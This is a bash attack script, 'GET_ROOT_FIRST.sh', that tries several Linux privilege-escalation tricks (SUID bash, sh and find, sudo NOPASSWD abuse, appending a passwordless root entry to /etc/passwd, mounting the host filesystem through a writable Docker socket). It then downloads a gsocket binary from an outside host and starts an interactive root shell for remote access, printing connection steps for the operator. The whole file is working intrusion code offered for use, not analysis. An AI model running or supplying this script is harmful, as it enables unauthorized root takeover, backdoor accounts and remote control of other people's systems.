#!/bin/bash
# GET_ROOT_FIRST.sh

echo "╔══════════════════════════════════════╗"
echo "║     GET ROOT FIRST, THEN SHELL       ║"
echo "╚══════════════════════════════════════╝"
echo ""

# Function to GET ROOT access
get_root_access() {
    echo "[*] Attempting to get ROOT privileges..."
    echo ""
    
    # METHOD 1: Check SUID bash/sh
    if [ -u "/bin/bash" ]; then
        echo "[+] METHOD 1: SUID bash FOUND!"
        echo "[>] Executing: /bin/bash -p -c 'whoami; id'"
        /bin/bash -p -c "echo '[SUCCESS] Now root!'; id"
        return 0
    fi
    
    if [ -u "/bin/sh" ]; then
        echo "[+] METHOD 2: SUID sh FOUND!"
        echo "[>] Executing: /bin/sh -p -c 'whoami; id'"
        /bin/sh -p -c "echo '[SUCCESS] Now root!'; id"
        return 0
    fi
    
    # METHOD 2: Check sudo
    echo "[*] Checking sudo permissions..."
    SUDO_OUT=$(sudo -l 2>/dev/null)
    if [ -n "$SUDO_OUT" ]; then
        echo "[+] Sudo access available!"
        echo "$SUDO_OUT"
        
        # Check if we can run bash
        if echo "$SUDO_OUT" | grep -q "/bin/bash"; then
            echo "[+] Can run bash with sudo!"
            sudo /bin/bash -c "echo '[SUCCESS] Now root via sudo!'; id"
            return 0
        fi
        
        # Check for NOPASSWD
        if echo "$SUDO_OUT" | grep -q "NOPASSWD"; then
            echo "[+] NOPASSWD sudo found!"
            CMD=$(echo "$SUDO_OUT" | grep "NOPASSWD" | head -1 | awk '{print $3}')
            echo "[>] Can run without password: $CMD"
            sudo $CMD -c "echo '[SUCCESS] Root via NOPASSWD!'; id"
            return 0
        fi
    fi
    
    # METHOD 3: SUID find exploit
    if [ -u "/usr/bin/find" ]; then
        echo "[+] METHOD 3: SUID find FOUND!"
        echo "[>] Exploiting with: find . -exec /bin/bash -p \\; -quit"
        /usr/bin/find . -exec /bin/bash -p -c "echo '[SUCCESS] Root via find!'; id" \\; -quit
        return 0
    fi
    
    # METHOD 4: Check writable /etc/passwd
    if [ -w "/etc/passwd" ]; then
        echo "[+] METHOD 4: /etc/passwd is WRITABLE!"
        echo "[>] Adding root user..."
        echo "root::0:0:root:/root:/bin/bash" >> /etc/passwd
        echo "[+] Added passwordless root user!"
        su - root -c "echo '[SUCCESS] Now root!'; id"
        return 0
    fi
    
    # METHOD 5: Docker socket
    if [ -w "/var/run/docker.sock" ]; then
        echo "[+] METHOD 5: Docker socket WRITABLE!"
        echo "[>] Getting root via Docker..."
        docker run -v /:/mnt --rm -it alpine chroot /mnt bash -c "echo '[SUCCESS] Root via Docker!'; id"
        return 0
    fi
    
    echo "[-] NO ROOT ACCESS FOUND"
    return 1
}

# Function to setup gsocket AFTER getting root
setup_gsocket_root() {
    echo ""
    echo "[*] Setting up Gsocket with ROOT access..."
    echo ""
    
    # Download gsocket
    cd /tmp
    rm -f gs_root.bin 2>/dev/null
    wget -q https://gsocket.io/x -O gs_root.bin || \
    curl -s https://gsocket.io/x -o gs_root.bin
    
    if [ ! -f gs_root.bin ]; then
        echo "[-] Failed to download gsocket"
        return 1
    fi
    
    chmod +x gs_root.bin
    
    # Generate key
    KEY="ROOT_$(date +%s)"
    echo "[+] ROOT Shell Ready!"
    echo "[*] Your ROOT Key: $KEY"
    echo "[*] On your PC run:"
    echo "    cd /tmp"
    echo "    wget https://gsocket.io/x -O gs.bin"
    echo "    chmod +x gs.bin"
    echo "    ./gs.bin -s $KEY"
    echo ""
    echo "[*] Starting ROOT shell in 5 seconds..."
    echo "=============================================="
    sleep 5
    
    # Start as root if possible
    if [ $(id -u) -eq 0 ]; then
        echo "[+] Running as ROOT!"
        exec ./gs_root.bin -s "$KEY" /bin/bash -i
    else
        echo "[+] Running as USER"
        exec ./gs_root.bin -s "$KEY" /bin/bash -i
    fi
}

# MAIN EXECUTION
main() {
    # Try to get root first
    if get_root_access; then
        echo ""
        echo "[+] SUCCESS: Got ROOT or found vulnerability!"
        echo "[*] Current user: $(whoami)"
        echo "[*] Current UID: $(id -u)"
    else
        echo ""
        echo "[-] Could not get root access"
        echo "[*] Current user: $(whoami)"
        echo "[*] Current UID: $(id -u)"
    fi
    
    # Setup gsocket
    setup_gsocket_root
}

# Run
main
